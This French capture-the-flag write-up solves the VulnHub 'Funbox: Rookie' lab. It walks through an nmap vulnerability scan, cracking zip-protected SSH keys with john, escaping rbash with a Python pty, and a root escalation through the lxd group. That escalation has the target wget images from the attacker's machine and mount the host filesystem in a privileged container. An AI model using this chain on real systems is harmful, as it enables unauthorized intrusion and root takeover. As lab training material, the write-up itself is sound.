---
title: Solution du CTF Funbox Rookie de VulnHub
tags: [CTF, VulnHub]
---

### Rocks & Rookie

[Funbox: Rookie](https://vulnhub.com/entry/funbox-rookie,520/) c'est le second opus de la série ce CTF "Funbox" d'un certain [0815R2d2](https://x.com/0815R2d2).

Le terminer s'est montré plus rapide que le précédent.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.121
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.121
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| vulners: 
|   cpe:/a:proftpd:proftpd:1.3.5e: 
|       SAINT:FD1752E124A72FD3A26EEB9B315E8382  10.0    https://vulners.com/saint/SAINT:FD1752E124A72FD3A26EEB9B315E8382        *EXPLOIT*
|       SAINT:950EB68D408A40399926A4CCAD3CC62E  10.0    https://vulners.com/saint/SAINT:950EB68D408A40399926A4CCAD3CC62E        *EXPLOIT*
|       SAINT:63FB77B9136D48259E4F0D4CDA35E957  10.0    https://vulners.com/saint/SAINT:63FB77B9136D48259E4F0D4CDA35E957        *EXPLOIT*
|       SAINT:1B08F4664C428B180EEC9617B41D9A2C  10.0    https://vulners.com/saint/SAINT:1B08F4664C428B180EEC9617B41D9A2C        *EXPLOIT*
|       PROFTPD_MOD_COPY        10.0    https://vulners.com/canvas/PROFTPD_MOD_COPY     *EXPLOIT*
--- snip ---
|       SSV:61050       5.0     https://vulners.com/seebug/SSV:61050    *EXPLOIT*
|_      CVE-2013-4359   5.0     https://vulners.com/cve/CVE-2013-4359
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 08:00:27:6B:A8:A5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.16 seconds
```

Le compte anonyme est activé sur le FTP. J'ai testé la faille `mod_copy` remontée par Nmap, mais ça n'avait pas l'air exploitable.

Il y a différents fichiers disponibles que j'ai récupéré via FileZilla.

```console
$ ftp anonymous@192.168.56.121
Connected to 192.168.56.121.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.56.121]
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.56.1 !
230-
230-The local time is: Tue Jul 01 19:27:25 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||50001|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
```

On a deux fichiers cachés qui contiennent des messages :

```console
$ file .*
.@admins: ASCII text
.@users:  ASCII text
$ cat .@admins 
SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290
$ cat .@users 
Hi Users,

be carefull with your keys. Find them in %yourname%.zip.
The passwords are the old ones.

Regards
root
$ cat .@admins | base64 -d
Hi Admins,

be carefull with your keys. Find them in %yourname%.zip.
The passwords are the old ones.

Regards
```

Les autres contiennent chacun une clé ssh :

```console
$ find . -name "*.zip" -exec unzip -l {} \;
Archive:  ./anna.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     1675  2020-07-25 12:42   id_rsa
---------                     -------
     1675                     1 file
Archive:  ./ariel.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     1675  2020-07-25 12:42   id_rsa
---------                     -------
     1675                     1 file
Archive:  ./bud.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     1675  2020-07-25 12:42   id_rsa
---------                     -------
     1675                     1 file
--- snip ---
```

Il s'avère que tous les fichiers zip sont protégés par mot de passe. J'extrais les hashs avec `zip2john`.

```
$ zip2john /tmp/funbox2/*.zip > /tmp/hash.txt 
ver 2.0 efh 5455 efh 7875 anna.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 ariel.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 bud.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 cathrine.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 homer.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 jessica.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 john.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 marge.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 miriam.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
ver 2.0 efh 5455 efh 7875 zlatan.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
```

Casser les hashs est très rapide :

```console
$ john --wordlist=wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (PKZIP [32/64])
Will run 4 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
iubire           (tom.zip/id_rsa)     
catwoman         (cathrine.zip/id_rsa)     
2g 0:00:00:01 DONE (2025-07-01 21:50) 1.504g/s 10784Kp/s 10796Kc/s 10796KC/s "3/3/06"..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Une fois désarchivé, la clé SSH de `John` permet de se connecter :

```console
$ ssh -i tom_key tom@192.168.56.121
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul  1 19:54:41 UTC 2025

  System load:  0.16              Processes:             115
  Usage of /:   66.5% of 4.37GB   Users logged in:       0
  Memory usage: 22%               IP address for enp0s3: 192.168.56.121
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul  1 19:53:03 2025 from 192.168.56.1
tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
tom@funbox2:~$ ls -al
total 40
drwxr-xr-x 5 tom  tom  4096 Jul 25  2020 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom     6 Jul 25  2020 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Jul 25  2020 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
-rw-r--r-- 1 tom  tom     0 Jul 25  2020 .sudo_as_admin_successful
-rw------- 1 tom  tom     0 Jul 25  2020 .viminfo
```

On retrouve le restricted bash de l'épisode 1 :

```console
tom@funbox2:~$ cd /var/www/html
-rbash: cd: restricted
tom@funbox2:~$ python3
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty
>>> pty.spawn("/bin/bash")
tom@funbox2:~$ cd /var/www/html
tom@funbox2:/var/www/html$ ls
index.html  robots.txt
```

### Like a déjà vu

L'utilisateur fait partie du groupe `lxd`, comme la dernière fois. On peut passer root via la même méthode :

```console
tom@funbox2:/var/tmp$ wget http://192.168.56.1/lxd.tar.xz
--2025-07-01 20:12:33--  http://192.168.56.1/lxd.tar.xz
Connecting to 192.168.56.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 920 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz          100%[===================>]     920  --.-KB/s    in 0s      

2025-07-01 20:12:33 (55.3 MB/s) - ‘lxd.tar.xz’ saved [920/920]

tom@funbox2:/var/tmp$ wget http://192.168.56.1/rootfs.squashfs
--2025-07-01 20:12:45--  http://192.168.56.1/rootfs.squashfs
Connecting to 192.168.56.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3076096 (2.9M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs     100%[===================>]   2.93M  --.-KB/s    in 0.02s   

2025-07-01 20:12:45 (124 MB/s) - ‘rootfs.squashfs’ saved [3076096/3076096]

tom@funbox2:/var/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
tom@funbox2:/var/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
Error: No storage pool found. Please create a new storage pool
tom@funbox2:/var/tmp$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
tom@funbox2:/var/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Error: Image with same fingerprint already exists
tom@funbox2:/var/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
tom@funbox2:/var/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
tom@funbox2:/var/tmp$ lxc start privesc
tom@funbox2:/var/tmp$ lxc exec privesc /bin/sh
~ # cd /mnt/root/root/
/mnt/root/root # ls
flag.txt
/mnt/root/root # cat flag.txt 
   ____  __  __   _  __   ___   ____    _  __             ___ 
  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |
 / _/  / /_/ /  /    /  / _  |/ /_/ / _>  <             / __/ 
/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ 
           ____ ___  ___  / /_ ___  ___/ /       / /          
 _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           
(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            

from @0815R2d2 with ♥
```

### La réponse D

En fait, la solution attendue est de retrouver le mot de passe de l'utilisateur `tom` (`xx11yy22!`) dans son historique MySQL. L'utilisateur fait partie du groupe `sudo` et peut passer root :

```console
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
tom@funbox2:~$ sudo su
root@funbox2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)
```
